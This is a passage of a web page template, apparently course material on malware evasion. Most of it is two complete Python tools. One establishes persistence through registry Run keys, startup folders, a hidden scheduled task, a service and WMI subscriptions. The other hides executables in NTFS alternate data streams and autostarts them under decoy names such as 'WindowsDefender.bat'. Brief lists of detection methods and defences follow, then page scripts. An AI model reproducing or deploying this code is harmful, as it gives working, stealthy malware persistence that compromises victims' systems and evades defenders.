        for hive, subkey in persistence_locations:
            try:
                key = winreg.OpenKey(hive, subkey, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, payload_path)
                winreg.CloseKey(key)
                
                successful_locations.append(f"{hive}\\{subkey}")
                print(f"✓ Registry persistence established: {subkey}")
                
            except PermissionError:
                print(f"✗ Permission denied: {subkey}")
            except Exception as e:
                print(f"✗ Failed: {subkey} - {e}")
        
        return successful_locations
    
    def startup_folder_persistence(self, payload_path):
        """Place persistence in startup folders"""
        startup_locations = [
            os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"),
            os.path.expandvars(r"%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
        ]
        
        successful_locations = []
        payload_name = os.path.basename(payload_path)
        
        for startup_folder in startup_locations:
            try:
                if os.path.exists(startup_folder):
                    shortcut_path = os.path.join(startup_folder, f"{payload_name}.lnk")
                    
                    # Create Windows shortcut
                    self._create_shortcut(shortcut_path, payload_path)
                    successful_locations.append(shortcut_path)
                    print(f"✓ Startup persistence: {startup_folder}")
                    
            except Exception as e:
                print(f"✗ Startup folder failed: {e}")
        
        return successful_locations
    
    def scheduled_task_persistence(self, payload_path, task_name="SystemMaintenance"):
        """Create scheduled task for persistence"""
        try:
            # XML template for scheduled task
            task_xml = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2">
  <RegistrationInfo>
    <Date>2024-01-01T00:00:00</Date>
    <Author>System</Author>
    <Description>System maintenance task</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <UserId>{self.current_user}</UserId>
    </LogonTrigger>
    <TimeTrigger>
      <Enabled>true</Enabled>
      <StartBoundary>2024-01-01T09:00:00</StartBoundary>
      <Repetition>
        <Interval>PT1H</Interval>
      </Repetition>
    </TimeTrigger>
  </Triggers>
  <Actions>
    <Exec>
      <Command>{payload_path}</Command>
    </Exec>
  </Actions>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
  </Settings>
</Task>'''
            
            # Save XML to temp file
            temp_xml = os.path.join(os.environ['TEMP'], f"{task_name}.xml")
            with open(temp_xml, 'w', encoding='utf-16') as f:
                f.write(task_xml)
            
            # Create scheduled task
            cmd = f'schtasks /create /tn "{task_name}" /xml "{temp_xml}" /f'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            # Cleanup temp file
            os.remove(temp_xml)
            
            if result.returncode == 0:
                print(f"✓ Scheduled task created: {task_name}")
                return task_name
            else:
                print(f"✗ Task creation failed: {result.stderr}")
                return None
                
        except Exception as e:
            print(f"✗ Scheduled task error: {e}")
            return None
    
    def service_persistence(self, payload_path, service_name="SystemUpdate"):
        """Create Windows service for persistence (requires admin)"""
        try:
            # Create service using sc command
            create_cmd = f'''sc create "{service_name}" binPath= "{payload_path}" start= auto'''
            result = subprocess.run(create_cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                # Start the service
                start_cmd = f'sc start "{service_name}"'
                subprocess.run(start_cmd, shell=True, capture_output=True)
                
                print(f"✓ Service created: {service_name}")
                return service_name
            else:
                print(f"✗ Service creation failed: {result.stderr}")
                return None
                
        except Exception as e:
            print(f"✗ Service error: {e}")
            return None
    
    def wmi_event_persistence(self, payload_path):
        """WMI event subscription persistence"""
        try:
            # Encode payload for WMI execution
            encoded_payload = base64.b64encode(payload_path.encode()).decode()
            
            wmi_commands = [
                # Create event filter
                f'''wmic /NAMESPACE:"\\\\root\\subscription" PATH __EventFilter CREATE Name="SystemMonitor", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"''',
                
                # Create event consumer
                f'''wmic /NAMESPACE:"\\\\root\\subscription" PATH CommandLineEventConsumer CREATE Name="SystemHandler", ExecutablePath="{payload_path}"''',
                
                # Bind filter to consumer
                f'''wmic /NAMESPACE:"\\\\root\\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name='SystemMonitor'", Consumer="CommandLineEventConsumer.Name='SystemHandler'"'''
            ]
            
            for cmd in wmi_commands:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                if result.returncode != 0:
                    print(f"✗ WMI command failed: {result.stderr}")
                    return False
            
            print("✓ WMI event persistence established")
            return True
            
        except Exception as e:
            print(f"✗ WMI persistence error: {e}")
            return False
    
    def _create_shortcut(self, shortcut_path, target_path):
        """Create Windows shortcut file"""
        try:
            import pythoncom
            from win32com.shell import shell, shellcon
            
            shortcut = pythoncom.CoCreateInstance(
                shell.CLSID_ShellLink,
                None,
                pythoncom.CLSCTX_INPROC_SERVER,
                shell.IID_IShellLink
            )
            
            shortcut.SetPath(target_path)
            shortcut.SetWorkingDirectory(os.path.dirname(target_path))
            
            persist_file = shortcut.QueryInterface(pythoncom.IID_IPersistFile)
            persist_file.Save(shortcut_path, 0)
            
        except ImportError:
            # Fallback: create batch file instead
            batch_content = f'@echo off\nstart "" "{target_path}"\n'
            batch_path = shortcut_path.replace('.lnk', '.bat')
            
            with open(batch_path, 'w') as f:
                f.write(batch_content)
    
    def establish_comprehensive_persistence(self, payload_path):
        """Establish persistence using multiple methods"""
        print(f"Establishing persistence for: {payload_path}")
        
        results = {
            'registry_locations': self.registry_run_keys(payload_path),
            'startup_locations': self.startup_folder_persistence(payload_path),
            'scheduled_task': self.scheduled_task_persistence(payload_path),
            'service': self.service_persistence(payload_path),
            'wmi_events': self.wmi_event_persistence(payload_path)
        }
        
        successful_methods = sum(1 for method, result in results.items() 
                               if result and (isinstance(result, list) and len(result) > 0 
                                            or isinstance(result, (str, bool)) and result))
        
        print(f"\nPersistence Summary: {successful_methods}/5 methods successful")
        return results

# Educational usage example
if __name__ == "__main__":
    # Example: establish persistence for a legitimate tool
    persistence_mgr = PersistenceManager()
    
    # Educational payload (harmless example)
    test_payload = r"C:\Windows\System32\notepad.exe"
    
    results = persistence_mgr.establish_comprehensive_persistence(test_payload)
    print(f"Persistence established: {results}")
</code></pre>
                            </div>
                        </div>
                    </div>

                    <!-- Persistence Detection Analysis -->
                    <div class="bg-gray-900/50 rounded-lg p-6">
                        <h4 class="text-lg font-semibold text-purple-400 mb-3">Persistence Detection & Forensics</h4>
                        <div class="grid md:grid-cols-2 gap-6">
                            <div>
                                <h5 class="text-white font-medium mb-2">Forensic Artifacts:</h5>
                                <ul class="text-gray-300 text-sm space-y-1">
                                    <li>• Registry key creation timestamps</li>
                                    <li>• Startup folder file modifications</li>
                                    <li>• Scheduled task XML signatures</li>
                                    <li>• Service installation events</li>
                                    <li>• WMI subscription anomalies</li>
                                </ul>
                            </div>
                            <div>
                                <h5 class="text-white font-medium mb-2">Detection Strategies:</h5>
                                <ul class="text-gray-300 text-sm space-y-1">
                                    <li>• Autostart location monitoring</li>
                                    <li>• Registry change detection</li>
                                    <li>• Task scheduler auditing</li>
                                    <li>• Service creation logging</li>
                                    <li>• WMI event correlation</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- ADS Evasion Implementation -->
            <div class="mb-12">
                <div class="stealth-card rounded-lg p-8 border border-green-500/30">
                    <div class="flex items-center mb-6">
                        <div class="w-16 h-16 bg-gradient-to-br from-green-500 to-green-600 rounded-full flex items-center justify-center mr-6">
                            <i class="fas fa-stream text-white text-2xl"></i>
                        </div>
                        <div>
                            <h3 class="text-3xl font-semibold text-green-400 mb-2">ADS Evasion Framework</h3>
                            <p class="text-gray-300">Alternate Data Streams for stealth operations</p>
                        </div>
                    </div>

                    <!-- ADS Techniques -->
                    <div class="mb-8">
                        <h4 class="text-xl font-semibold text-white mb-4">Alternate Data Stream Techniques</h4>
                        <div class="relative">
                            <div class="code-container relative">
                                <div class="warning-overlay" id="ads-warning">
                                    <span>Click to reveal ADS evasion code (Educational purposes only)</span>
                                </div>
                                <pre class="blur-sensitive p-6" id="ads-code"><code class="language-python"># ADS Evasion Framework - Educational Research
import os, subprocess, base64, tempfile
from pathlib import Path

class ADSManager:
    """Alternate Data Streams for educational research"""
    
    def __init__(self):
        self.ads_locations = []
        
    def create_ads_payload(self, host_file, stream_name, payload_data):
        """Create ADS containing payload data"""
        try:
            ads_path = f"{host_file}:{stream_name}"
            
            # Write data to ADS
            with open(ads_path, 'wb') as ads_file:
                if isinstance(payload_data, str):
                    ads_file.write(payload_data.encode('utf-8'))
                else:
                    ads_file.write(payload_data)
            
            print(f"✓ ADS created: {ads_path}")
            self.ads_locations.append(ads_path)
            return ads_path
            
        except Exception as e:
            print(f"✗ ADS creation failed: {e}")
            return None
    
    def hide_executable_in_ads(self, host_file, executable_path, stream_name="data"):
        """Hide executable in ADS"""
        try:
            # Read executable
            with open(executable_path, 'rb') as exe_file:
                exe_data = exe_file.read()
            
            # Encode to avoid detection
            encoded_data = base64.b64encode(exe_data)
            
            # Store in ADS
            ads_path = self.create_ads_payload(host_file, stream_name, encoded_data)
            
            if ads_path:
                print(f"✓ Executable hidden in ADS: {ads_path}")
                return ads_path
            
        except Exception as e:
            print(f"✗ Executable hiding failed: {e}")
            return None
    
    def execute_from_ads(self, ads_path):
        """Execute payload from ADS"""
        try:
            # Read and decode from ADS
            with open(ads_path, 'rb') as ads_file:
                encoded_data = ads_file.read()
            
            decoded_data = base64.b64decode(encoded_data)
            
            # Write to temp file and execute
            temp_file = tempfile.NamedTemporaryFile(suffix='.exe', delete=False)
            temp_file.write(decoded_data)
            temp_file.close()
            
            # Execute
            process = subprocess.Popen(temp_file.name, shell=True)
            
            print(f"✓ Executed from ADS: {ads_path}")
            return process
            
        except Exception as e:
            print(f"✗ ADS execution failed: {e}")
            return None
    
    def create_ads_persistence(self, host_file, payload_path):
        """Create persistent ADS storage"""
        persistence_methods = {
            'registry_value': self._ads_registry_persistence,
            'startup_script': self._ads_startup_persistence,
            'task_scheduler': self._ads_task_persistence
        }
        
        results = {}
        
        for method_name, method_func in persistence_methods.items():
            try:
                result = method_func(host_file, payload_path)
                results[method_name] = result
                
            except Exception as e:
                print(f"✗ {method_name} failed: {e}")
                results[method_name] = False
        
        return results
    
    def _ads_registry_persistence(self, host_file, payload_path):
        """Use ADS with registry persistence"""
        try:
            # Hide payload in ADS
            ads_path = self.hide_executable_in_ads(host_file, payload_path, "regdata")
            
            if ads_path:
                # Create registry entry pointing to ADS extractor
                extractor_script = f'''
import base64, tempfile, subprocess, os
ads_path = r"{ads_path}"
with open(ads_path, 'rb') as f:
    data = base64.b64decode(f.read())
temp = tempfile.NamedTemporaryFile(suffix='.exe', delete=False)
temp.write(data)
temp.close()
subprocess.Popen(temp.name)
os.unlink(temp.name)
'''
                
                # Save extractor as legitimate-looking file
                extractor_path = os.path.join(os.environ['TEMP'], 'system_update.py')
                with open(extractor_path, 'w') as f:
                    f.write(extractor_script)
                
                # Add to registry
                import winreg
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                   r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 
                                   0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "SystemUpdater", 0, winreg.REG_SZ, 
                                f'python "{extractor_path}"')
                winreg.CloseKey(key)
                
                return True
                
        except Exception as e:
            print(f"✗ Registry ADS persistence failed: {e}")
            return False
    
    def _ads_startup_persistence(self, host_file, payload_path):
        """Use ADS with startup folder persistence"""
        try:
            # Hide in ADS
            ads_path = self.hide_executable_in_ads(host_file, payload_path, "startup")
            
            if ads_path:
                # Create startup script
                startup_folder = os.path.expandvars(
                    r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
                )
                startup_script = os.path.join(startup_folder, "WindowsDefender.bat")
                
                batch_content = f'''@echo off
python -c "
import base64, tempfile, subprocess, os
with open(r'{ads_path}', 'rb') as f:
    data = base64.b64decode(f.read())
temp = tempfile.NamedTemporaryFile(suffix='.exe', delete=False)
temp.write(data)
temp.close()
subprocess.Popen(temp.name)
"'''
                
                with open(startup_script, 'w') as f:
                    f.write(batch_content)
                
                return True
                
        except Exception as e:
            print(f"✗ Startup ADS persistence failed: {e}")
            return False
    
    def _ads_task_persistence(self, host_file, payload_path):
        """Use ADS with scheduled task persistence"""
        try:
            # Hide in ADS
            ads_path = self.hide_executable_in_ads(host_file, payload_path, "taskdata")
            
            if ads_path:
                # Create extraction script
                extractor_path = os.path.join(os.environ['TEMP'], 'maintenance.py')
                
                extractor_content = f'''
import base64, tempfile, subprocess, os
ads_file = r"{ads_path}"
try:
    with open(ads_file, 'rb') as f:
        decoded = base64.b64decode(f.read())
    temp = tempfile.NamedTemporaryFile(suffix='.exe', delete=False)
    temp.write(decoded)
    temp.close()
    subprocess.Popen(temp.name, shell=True)
except:
    pass
'''
                
                with open(extractor_path, 'w') as f:
                    f.write(extractor_content)
                
                # Create scheduled task
                task_cmd = f'''schtasks /create /tn "SystemMaintenance" /tr "python {extractor_path}" /sc onlogon /f'''
                result = subprocess.run(task_cmd, shell=True, capture_output=True)
                
                return result.returncode == 0
                
        except Exception as e:
            print(f"✗ Task ADS persistence failed: {e}")
            return False
    
    def enumerate_ads(self, directory_path):
        """Enumerate existing ADS in directory"""
        try:
            ads_found = []
            
            # Use dir command to find ADS
            cmd = f'dir /r "{directory_path}"'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                for line in lines:
                    if ':' in line and '$DATA' in line:
                        # Parse ADS information
                        parts = line.strip().split()
                        if len(parts) >= 2:
                            size = parts[0]
                            stream_name = parts[1].split(':')[1]
                            ads_found.append({
                                'stream': stream_name,
                                'size': size,
                                'line': line.strip()
                            })
            
            return ads_found
            
        except Exception as e:
            print(f"✗ ADS enumeration failed: {e}")
            return []
    
    def cleanup_ads(self, host_file, stream_name=None):
        """Remove ADS from file"""
        try:
            if stream_name:
                # Remove specific stream
                ads_path = f"{host_file}:{stream_name}"
                os.remove(ads_path)
                print(f"✓ Removed ADS: {ads_path}")
            else:
                # Remove all streams (requires special handling)
                # Copy file content without ADS
                temp_file = f"{host_file}.tmp"
                
                with open(host_file, 'rb') as source:
                    with open(temp_file, 'wb') as dest:
                        dest.write(source.read())
                
                os.replace(temp_file, host_file)
                print(f"✓ Cleaned all ADS from: {host_file}")
                
        except Exception as e:
            print(f"✗ ADS cleanup failed: {e}")

# Educational usage example
if __name__ == "__main__":
    ads_mgr = ADSManager()
    
    # Create test host file
    host_file = os.path.join(os.environ['TEMP'], 'legitimate_document.txt')
    with open(host_file, 'w') as f:
        f.write("This is a legitimate document file.")
    
    # Example: Hide data in ADS
    secret_data = "This is hidden data in ADS"
    ads_path = ads_mgr.create_ads_payload(host_file, "hidden", secret_data)
    
    # Enumerate ADS
    temp_dir = os.environ['TEMP']
    found_ads = ads_mgr.enumerate_ads(temp_dir)
    print(f"Found ADS: {found_ads}")
    
    # Cleanup
    if ads_path:
        ads_mgr.cleanup_ads(host_file, "hidden")
</code></pre>
                            </div>
                        </div>
                    </div>

                    <!-- ADS Detection Analysis -->
                    <div class="bg-gray-900/50 rounded-lg p-6">
                        <h4 class="text-lg font-semibold text-green-400 mb-3">ADS Detection & Forensics</h4>
                        <div class="grid md:grid-cols-2 gap-6">
                            <div>
                                <h5 class="text-white font-medium mb-2">Detection Methods:</h5>
                                <ul class="text-gray-300 text-sm space-y-1">
                                    <li>• PowerShell Get-Item -Stream command</li>
                                    <li>• DIR /R command line enumeration</li>
                                    <li>• FSUTIL behavior for ADS detection</li>
                                    <li>• Specialized forensic tools (LADS, Streams)</li>
                                    <li>• File size discrepancy analysis</li>
                                </ul>
                            </div>
                            <div>
                                <h5 class="text-white font-medium mb-2">Defensive Measures:</h5>
                                <ul class="text-gray-300 text-sm space-y-1">
                                    <li>• Regular ADS scanning automation</li>
                                    <li>• File integrity monitoring with ADS</li>
                                    <li>• Behavioral analysis of ADS usage</li>
                                    <li>• Network traffic correlation</li>
                                    <li>• SIEM integration for ADS events</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
            
            <div>
                <h2 class="text-3xl font-bold text-white mb-8">Defense Development</h2>
                <div class="bg-gray-800/30 rounded-lg p-6 mb-6">
                    <h3 class="text-xl font-semibold text-white mb-4">Detection Improvements</h3>
                    <div class="space-y-4">
                        <div class="flex items-start p-4 bg-gray-900/50 rounded">
                            <i class="fas fa-search text-green-400 text-xl mr-4 mt-1"></i>
                            <div>
                                <h4 class="text-white font-medium mb-2">Behavioral Analysis</h4>
                                <p class="text-gray-300 text-sm">
                                    Developing advanced behavioral detection that focuses on actions rather than signatures.
                                </p>
                            </div>
                        </div>
                        
                        <div class="flex items-start p-4 bg-gray-900/50 rounded">
                            <i class="fas fa-brain text-teal-400 text-xl mr-4 mt-1"></i>
                            <div>
                                <h4 class="text-white font-medium mb-2">Machine Learning Detection</h4>
                                <p class="text-gray-300 text-sm">
                                    Training ML models to identify evasive malware through pattern recognition.
                                </p>
                            </div>
                        </div>
                        
                        <div class="flex items-start p-4 bg-gray-900/50 rounded">
                            <i class="fas fa-layer-group text-emerald-400 text-xl mr-4 mt-1"></i>
                            <div>
                                <h4 class="text-white font-medium mb-2">Multi-Layer Defense</h4>
                                <p class="text-gray-300 text-sm">
                                    Implementing multiple detection layers to counter sophisticated evasion.
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="bg-gray-800/30 rounded-lg p-6">
                    <h3 class="text-xl font-semibold text-white mb-4">Research Metrics</h3>
                    <div class="grid grid-cols-2 gap-4">
                        <div class="text-center p-4 bg-green-900/20 rounded">
                            <div class="text-2xl font-bold text-green-400">15+</div>
                            <div class="text-gray-300 text-sm">Evasion Techniques</div>
                        </div>
                        <div class="text-center p-4 bg-teal-900/20 rounded">
                            <div class="text-2xl font-bold text-teal-400">8</div>
                            <div class="text-gray-300 text-sm">Detection Methods</div>
                        </div>
                        <div class="text-center p-4 bg-emerald-900/20 rounded">
                            <div class="text-2xl font-bold text-emerald-400">95%</div>
                            <div class="text-gray-300 text-sm">Detection Rate</div>
                        </div>
                        <div class="text-center p-4 bg-cyan-900/20 rounded">
                            <div class="text-2xl font-bold text-cyan-400">24/7</div>
                            <div class="text-gray-300 text-sm">Monitoring</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Key Findings -->
    <section class="py-12 bg-gray-800/30 rounded-2xl mb-12">
        <div class="px-8">
            <div class="text-center mb-12">
                <h2 class="text-3xl font-bold text-white mb-4">Research Findings</h2>
                <p class="text-gray-300">
                    Critical insights for improving cybersecurity defenses against evasive malware
                </p>
            </div>
            
            <div class="grid md:grid-cols-3 gap-8">
                <div class="text-center">
                    <div class="w-16 h-16 bg-gradient-to-r from-green-500 to-teal-500 rounded-full flex items-center justify-center mx-auto mb-4">
                        <i class="fas fa-eye-slash text-white text-xl"></i>
                    </div>
                    <h3 class="text-lg font-bold text-white mb-3">Advanced Evasion</h3>
                    <p class="text-gray-300 text-sm">
                        Modern malware employs sophisticated evasion techniques requiring advanced detection methods.
                    </p>
                </div>
                
                <div class="text-center">
                    <div class="w-16 h-16 bg-gradient-to-r from-teal-500 to-emerald-500 rounded-full flex items-center justify-center mx-auto mb-4">
                        <i class="fas fa-shield-alt text-white text-xl"></i>
                    </div>
                    <h3 class="text-lg font-bold text-white mb-3">Behavioral Focus</h3>
                    <p class="text-gray-300 text-sm">
                        Behavioral analysis proves more effective than signature-based detection for evasive threats.
                    </p>
                </div>
                
                <div class="text-center">
                    <div class="w-16 h-16 bg-gradient-to-r from-emerald-500 to-cyan-500 rounded-full flex items-center justify-center mx-auto mb-4">
                        <i class="fas fa-brain text-white text-xl"></i>
                    </div>
                    <h3 class="text-lg font-bold text-white mb-3">AI Integration</h3>
                    <p class="text-gray-300 text-sm">
                        Machine learning significantly improves detection rates for previously unknown evasion techniques.
                    </p>
                </div>
            </div>
        </div>
    </section>

    <!-- Back to Second Semester -->
    <section class="py-12 bg-gray-800/30 rounded-lg text-center">
        <a href="{{ route('nexus.second-semester') }}" class="inline-flex items-center px-8 py-4 bg-gradient-to-r from-green-600 to-teal-600 hover:from-green-700 hover:to-teal-700 text-white font-semibold rounded-lg transition-all duration-300 transform hover:scale-105">
            <i class="fas fa-arrow-left mr-3"></i>
            Back to Second Semester
        </a>
    </section>
</div>
@endsection

@push('scripts')
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>

<script>
document.addEventListener('DOMContentLoaded', function() {
    // Initialize GSAP ScrollTrigger
    gsap.registerPlugin(ScrollTrigger);
    
    // Animate reveal elements on scroll
    gsap.utils.toArray('.smooth-reveal').forEach(element => {
        gsap.fromTo(element, 
            {
                opacity: 0,
                y: 50,
                scale: 0.95
            },
            {
                opacity: 1,
                y: 0,
                scale: 1,
                duration: 0.8,
                ease: "power3.out",
                scrollTrigger: {
                    trigger: element,
                    start: "top 85%",
                    toggleActions: "play none none reverse"
                }
            }
        );
    });
    
    // Animate stats numbers
    function animateCounter(element) {
        const target = parseInt(element.dataset.target);
        let current = 0;
        const increment = target / 50;
        const timer = setInterval(() => {
            current += increment;
            if (current >= target) {
                current = target;
                clearInterval(timer);
            }
            element.textContent = Math.floor(current);
        }, 30);
    }
    
    // Animate progress bars
    function animateProgressBar(element) {
        const width = element.dataset.width;
        gsap.to(element, {
            width: width + '%',
            duration: 1.5,
            ease: "power2.out",
            delay: 0.5
        });
    }
    
    // Trigger animations when stats section is visible
    const statsObserver = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                // Animate counters
                entry.target.querySelectorAll('.stats-number').forEach(animateCounter);
                
                // Animate progress bars
                entry.target.querySelectorAll('.progress-bar').forEach(animateProgressBar);
                
                statsObserver.unobserve(entry.target);
            }
        });
    }, { threshold: 0.5 });
    
    const heroSection = document.querySelector('.evasion-hero');
    if (heroSection) {
        statsObserver.observe(heroSection);
    }
    
    // Enhanced card hover effects
    document.querySelectorAll('.stealth-card').forEach(card => {
        card.addEventListener('mouseenter', function() {
            gsap.to(this, {
                y: -12,
                scale: 1.03,
                duration: 0.4,
                ease: "power2.out"
            });
        });
        
        card.addEventListener('mouseleave', function() {
            gsap.to(this, {
                y: 0,
                scale: 1,
                duration: 0.4,
                ease: "power2.out"
            });
        });
    });
    
    // Floating particles animation
    gsap.utils.toArray('.particle').forEach(particle => {
        gsap.to(particle, {
            y: -30,
            rotation: 360,
            duration: gsap.utils.random(4, 8),
            repeat: -1,
            yoyo: true,
            ease: "power1.inOut",
            delay: gsap.utils.random(0, 2)
        });
    });
    
    // Smooth button hover effects
    document.querySelectorAll('button, a').forEach(button => {
        button.addEventListener('mouseenter', function() {
            gsap.to(this, {
                scale: 1.05,
                duration: 0.2,
                ease: "power2.out"
            });
        });
        
        button.addEventListener('mouseleave', function() {
            gsap.to(this, {
                scale: 1,
                duration: 0.2,
                ease: "power2.out"
            });
        });
    });
    
    // Progress bar animations for defense section
    const progressBars = document.querySelectorAll('.progress-animate');
    const progressObserver = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                const width = entry.target.style.width;
                entry.target.style.width = '0%';
                
                gsap.to(entry.target, {
                    width: width,
                    duration: 2,
                    ease: "power2.out",
                    delay: 0.3
                });
                
                progressObserver.unobserve(entry.target);
            }
        });
    }, { threshold: 0.5 });
    
    progressBars.forEach(bar => progressObserver.observe(bar));
    
    // Initialize Prism for syntax highlighting
    if (typeof Prism !== 'undefined') {
        Prism.highlightAll();
    }
});
</script>
@endpush
